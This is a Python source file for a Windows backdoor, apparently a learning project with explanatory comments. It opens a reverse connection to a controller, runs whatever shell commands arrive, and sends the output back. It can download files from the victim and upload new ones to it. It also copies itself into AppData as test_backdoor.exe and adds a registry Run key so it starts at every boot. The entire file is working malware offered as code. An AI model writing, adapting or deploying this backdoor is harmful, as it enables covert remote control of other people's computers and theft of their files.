import socket
#subprocess :#The Python subprocess module can be used to run new programs or applications
import subprocess
import json
import base64
import os
import shutil #operation on a file like a copy, create
import sys
import time


def reliable_send(data): #send and recieve data as much as we want
        
    #sock.send(data)
    try:
        if isinstance(data, bytes):
            # If data is bytes, encode it to a base64-encoded string as we are getting data in 
            #Base64 encoding is a method to encode binary data as ASCII characters.
            
            json_data = json.dumps({'data': base64.b64encode(data).decode()})
        else:
            # Otherwise, serialize the data as JSON
            
            json_data = json.dumps(data)
        sock.send(json_data.encode())  # Send the JSON data in sequesnce bytes using UTF8 encoded
    except Exception as e:
        print("Error sending data:", e)

def reliable_recv():
 data = b""  # Initialize as bytes
     
 while True:
      try: 
                  
         data=data+sock.recv(1024)
         json_message = data.decode() 
         data = json.loads(json_message)  # Parse the JSON message
                            
         return data['data']   
        
      except :
         continue
        
      
             
def connection(): #program continues to make connection until connected
    while True:
        time.sleep(5)
        try:
            
            sock.connect(("127.0.0.1",54320))
            value=shell()
            if value == ("q" or "Q"):
             break
            else:
                continue        
        except:
             connection()    

def shell():
    while True:
        command=reliable_recv()
        #print("Inside shell function")
        
        if(command ==("q" or "Q")):
         return command
         break
        elif command[:2] == "cd" and len(command) >1:
            try:
                os.chdir(command[3:])
                
            except:
                   continue 
        elif command[:8] == "download":
           try: 
            file=open(command[9:],"rb")
            reliable_send(base64.b64encode(file.read()))
           except Exception as e:
             print("Failed to send file",e)    
        elif command[:6] == "upload":
               file1=open(command[7:],"wb")
               result=reliable_recv()
               file1.write(base64.b64decode(result))



        else:
          
            #subprocess.Popen()--> creates a new process and executes the specified command
            #shell-->True indicates that the command will be executed through the shell.
            #stdout -->subprocess.PIPE redirects the standard output (stdout) of the process to a pipe, allowing it to be captured programmatically.


            try:
                proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result=proc.stdout.read() + proc.stderr.read()
                reliable_send(result)
            except:
                 reliable_send("Can't Execute")   
location=os.environ["appdata"] + "\\test_backdoor.exe"      #os.environ check appdata folder from environment  and will be copied in AppData\Roaming directory for storing the executable file

## Running EXE and settign registry key in windows for persistence running of code ##

if not os.path.exists(location): #checks if path already exist or not
 try:
   shutil.copyfile(sys.executable,location)     #copy executable in the location using shutil copyfile function
   subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' +location+ '"',shell=True) #add registry key so very time system restart program exe will run
 except:
    print("No executable")

sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("connection establish to server")  
connection()
sock.close()